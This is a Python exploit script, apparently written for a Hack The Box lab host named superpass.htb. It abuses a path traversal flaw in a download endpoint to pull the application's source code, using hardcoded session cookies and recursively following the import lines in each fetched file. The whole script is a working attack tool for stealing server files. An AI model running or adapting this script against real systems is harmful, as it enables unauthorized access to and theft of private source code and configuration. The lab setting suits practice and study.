import requests
import os
import re

base_url = 'http://superpass.htb/download?fn=../app/app/'
cookies = {'remember_token':'9|8f50cc62e035672203937ef350c45d6a6780afafd9114b725dfb34ffa10cd42e92e484635b44b3f13d76ce1f6af818f2501684844daf93217e66ec4af933165f', 'session':'eyJfZnJlc2giOmZhbHNlLCJfdXNlcl9pZCI6IjkifQ.ZAXkfg.B5wOyAl5XLizV5AuEyDMiOjbHh8'}


def is_import(line: str) -> int:
    """
    Detect import line.
    Arguments:
        line: string
    Returns:
        0: is not a import line
        1: import ...
        2: from ... import ...
    """
    if 'import' not in line:
      return 0
    if 'from' not in line:
      return 1
    return 2

def next_non_space(string, start):
  """
  Finds the next position in the string from the start point that is not a space.

  Args:
      string (str): The string to search.
      start (int): The index to start searching from.

  Returns:
      int: The index of the next non-space character, or -1 if none is found.
  """
  for i in range(start, len(string)):
      if string[i] != ' ':
          return i
  return -1

def get_file_name(line: str, import_mode: int) -> list:
  """
  Get file name from import line.
  Arguments:
      line: string
      import_mode: 1: import ... | 2: from ... import ...
  Returns:
      file_name: string
  """
  
  if import_mode == 1:
    pattern = r'^import\s+([\w\.]+)'
    match = re.search(pattern, line)
    if match:
      import_name = match.group(1)
      return [os.path.join(*import_name.split('.')) + '.py']
    
  else:
    pattern = r'^from\s+([\w\.]+)\s+import\s+([\w\.]+)'

    match = re.search(pattern, line)
    if match:
      module_name = match.group(1)
      import_name = match.group(2)
      return [os.path.join(*module_name.split('.')) + '.py', os.path.join(*module_name.split('.'), *import_name.split('.')) + '.py']
    
def recursion(path: str):
  """
  check if file exist.
  save file to folder.
  call recursion
  Arguments:
    path: str
  """
  # request 3 times because sometimes there is a server side error even though the file exists
  for i in range(3):
    resp = requests.get(base_url + path, cookies=cookies)
    if resp.status_code == 200:
      break
  if resp.status_code != 200:
    return
  
  if os.path.exists(path):
    return
  
  os.makedirs(os.path.dirname(path), exist_ok=True)
  with open(path, "w+") as file:
    file.write(resp.text)
  
  lines = resp.text.split('\n')
  for line in lines:
      import_mode = is_import(line)
      if import_mode:
        file_names = get_file_name(line.strip(), import_mode)
        print(f"{line}: {file_names}")
        if file_names is not None:
          for file_name in file_names:
            recursion(file_name)

def main():
  recursion(os.path.join('superpass', 'app.py'))
  
if __name__ == '__main__':
  main()



